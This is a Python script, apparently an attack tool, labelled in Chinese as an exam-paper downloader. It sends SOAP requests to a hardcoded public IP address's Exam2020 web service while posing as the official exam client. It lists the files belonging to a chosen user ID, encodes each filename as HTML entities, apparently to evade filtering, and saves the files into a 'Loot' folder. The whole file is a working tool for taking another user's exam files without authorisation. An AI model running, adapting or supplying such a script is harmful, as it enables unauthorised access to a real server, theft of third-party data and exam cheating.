import requests
import base64
import os
import xml.etree.ElementTree as ET

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
TARGET_UID = 9205 
SAVE_DIR = f"./Loot_Final_{TARGET_UID}"
# ===========================================

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def get_exam_files_list(uid):
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetExamFiles xmlns="http://tempuri.org/">
          <uid>{uid}</uid>
        </GetExamFiles>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/GetExamFiles"
        
        print(f"[*] (1/2) 正在查询 ID {uid} 的列表...")
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=10)
        
        if response.status_code != 200:
            print(f"[!] 列表查询失败: {response.status_code}")
            return []

        root = ET.fromstring(response.text)
        ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
        
        files = []
        for string_elem in root.findall(".//def:string", ns):
            if string_elem.text:
                files.append(string_elem.text)
        return files

    except Exception as e:
        print(f"[!] 查询异常: {e}")
        return []

def download_file(uid, filename):
    encoded_filename = to_html_entities(filename)
    
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetExamFile xmlns="http://tempuri.org/">
          <uid>{uid}</uid>
          <filename>{encoded_filename}</filename>
        </GetExamFile>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/GetExamFile"
        
        print(f"[*] (2/2) 正在下载: {filename}")
        
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=30)

        if response.status_code != 200:
            print(f"    [!] 下载失败 (Status: {response.status_code})")
            print(f"    [Server Error] {response.text[:200]}") # 打印部分错误信息
            return

        root = ET.fromstring(response.text)
        ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
        
        result_elem = root.find(".//def:GetExamFileResult", ns)
        
        if result_elem is not None and result_elem.text:
            file_data = base64.b64decode(result_elem.text)
            
            save_path = os.path.join(SAVE_DIR, filename)
            with open(save_path, "wb") as f:
                f.write(file_data)
            print(f"    [+] 成功! 已保存: {save_path} ({len(file_data)} bytes)")
        else:
            print(f"    [-] 文件内容为空")

    except Exception as e:
        print(f"    [!] 下载异常: {e}")

if __name__ == "__main__":
    if not os.path.exists(SAVE_DIR):
        os.makedirs(SAVE_DIR)

    print("=== Python 考卷下载器 (结构修正版) ===")
    
    files = get_exam_files_list(TARGET_UID)
    
    if files:
        print(f"[+] 发现 {len(files)} 个文件。")
        for f in files:
            download_file(TARGET_UID, f)
            
        print("\n[★] 任务完成。请查看文件夹。")
        try: os.startfile(SAVE_DIR)
        except: pass
    else:
        print("[-] 未找到文件。")